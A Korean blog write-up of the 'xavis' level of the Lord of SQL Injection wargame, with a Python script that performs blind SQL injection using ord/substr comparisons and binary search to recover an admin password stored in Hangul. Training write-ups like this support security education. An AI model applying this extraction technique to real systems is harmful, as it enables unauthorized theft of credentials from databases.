---
title: LOS - 19번 xavis
category: Lord of SQL Injection
---

# [19] xavis

## 문제
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbOK0DW%2FbtrnE823tg2%2FTk9pBzePoYO2Rqn92Lq8Xk%2Fimg.png">

## 풀이
오랜만에 만나는 Blind SQLi 문제다.

solve 조건은 언제나와 같이 admin 계정의 pw를 알아내는 것이다.

<br>

preg_match를 보면 regex와 like를 필터링하고 있다.

regex는 Sql 정규표현식인 regexp를 걸러내기 위한 것으로 보인다.

정작 =는 필터링 하고 있지 않기 때문에 유의미한 제약이 있어보이진 않는다.

<br>

그런데 너무 제약이 없다는 점이 좀 꺼림칙하다.

겉으로 보기에는 그냥 기본적인 Blind 문제 같지만... 그럴리가 없는데...?

<br> 

아니나 다를까, 기존의 자동화 코드가 먹히질 않았다.

필터에 걸린 것도 뭐가 잘못된 것도 아닌데 아스키 코드를 전체 다 돌고도 맞는 문자를 뽑아내오지 못했다.

불현듯 머릿속을 스친 생각은... 아 이거 한글인 것 같다ㅋㅋㅋㅋㅋㅠ

<br>

한글은 유니코드 문자셋을 통해 표현되기 때문에 당연한 말이지만 아스키 번호를 백날 돌아봐야 찾을 수가 없다.

한글로 된 데이터를 탐색하는 방법에는 여러가지가 있을 수 있겠지만 새로운 챌린지가 생긴 김에 그냥 내 식대로 (야매로) 한번 접근해보았다...ㅎ!

<br>

한글을 표현하는 유니코드는 정해진 16진수 값을 갖고 있고, 이 값들은 10진수로 변환이 가능하다.

10진수로 표현된 값은 대소 비교가 가능하다는 점과 이전에 몇번 등장했었던 ord 함수를 이용해보았다.

- 한글 유니코드 10진수 : 44032 '가' ~ 55203 '힣'

- ord : 해당 문자의 유니코드 값을 반환하는 함수

<br>

추가로, 이전까지와는 달리 탐색해야하는 번호의 개수가 무지막지하게.. 많기 때문에

세월아 네월아 하나하나 탐색해서는 시간이 과도하게 오래 걸리게 되는 문제에 직면하게 되었다.

그래서 미뤄뒀던 2진 탐색 알고리즘까지 한번 구현해보았다.


<br>
 

**2진 탐색을 적용한 LoS 19번 Python 자동화 코드**이다.

```python
import requests

def send(param):
    url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"
    cookie = "dfksep8hnmequ6sm0qe1iu65pa"
    head = {"PHPSESSID":f"{cookie}"}
    my_url = url+param
    res = requests.get(my_url, cookies=head)
    return res.text

print("💘 LoS 19를 시작합니다")

ans = ""
endpoint = False

for len in range(1, 30):
    if(endpoint):
        break
    print(f"{len}번째 문자에 대해 검색합니다..")
    start = 44032
    end = 55203
    while True:
        if(endpoint):
            print(f"{len}번째 문자는 존재하지 않습니다.")
            print(f"👏 pw의 정체는 [{ans}]입니다!")
            break
        if(start==end):
            endpoint = True
        middle = round((start+end)/2)
        param=f"?pw=' || id=\"admin\" %26%26 ord(substr(pw,{len},1))>={middle} %23"
        if("Hello admin" in send(param)):
            param=f"?pw=' || id=\"admin\" %26%26 ord(substr(pw,{len},1))={middle} %23"
            if("Hello admin" in send(param)):
                print(f"{len}번째 문자의 십진수 → {middle}")
                ans += chr(middle)
                break
            else:
                start = middle
                continue
        else:
            end = middle
            continue
```

① HTTP 요청을 보내는 과정을 send() 함수로 분리했다.

② Sql에서 한글은 3Byte로 저장되는데, 이런저런 예외사항이 있기 때문에 length 함수로 정확한 문자열의 길이를 알아낼 수는 없다고 한다. 그래서 그냥 1부터 30까지 돌다가 pw를 완전히 찾으면 알아서 반복문을 탈출하게끔 구현했다. 설마 pw가 30자 보다 길진 않겠지...

③ 한글이 아닌 다른 문자가 섞여있을 시에는 사용할 수 없다는 분명한 한계점이 있다. 일단 시도해보고 안되면 수정하려고 했지만 운이 좋게도 pw가 그냥 한글 뿐이라서 여기서 구현이 종료되었다. 추가적인 구현을 해야 됐었더라면, 아마 해당 문자의 ord 값이 44032 보다 작을 시 바로 아스키 번호를 돌게끔 해주었을 것 같다.

<br>

다음은 해당 코드의 실행 결과이다.


<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FzpB3U%2FbtrnBiTbjuW%2FXg3aUFYa1g6w3znjkuyNa1%2Fimg.png">


Blind 공격 결과, 입력할 답은 `우왕굳` 이다.


## 결과
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FqxRPT%2FbtrnCl9u4o0%2FgKISYRR1ebKg5PoezUu2n0%2Fimg.png">